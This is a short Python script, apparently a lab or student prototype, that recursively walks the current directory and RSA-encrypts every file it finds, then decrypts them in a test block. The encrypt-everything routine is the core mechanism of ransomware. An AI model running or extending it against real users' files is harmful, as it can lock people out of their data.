import os

from MyRSAEncrypt import *
from CONSTANTS import *


def Encrypt():
    checkKeys()

    cwd = os.getcwd()

    filenames = []

    # traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in os.walk("."):
        path = root.split(os.sep)
        pathToFile = cwd

        if len(path) > 1:
            for i in range(1, len(path)):
                pathToFile = pathToFile + "\\" + path[i]
        
        for file in files:
            filepath = pathToFile + "\\" + file
            filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)
            filenames.append(filename)

    return filenames

def Decrypt(filenames):
    for filename in filenames:
        MyRSADecrypt(filename, RSA_PRIVATE_KEY_FILEPATH)
            
    

# =====================
# TEST
# =====================

if __name__ == "__main__":
    filenames = Encrypt()
    Decrypt(filenames)
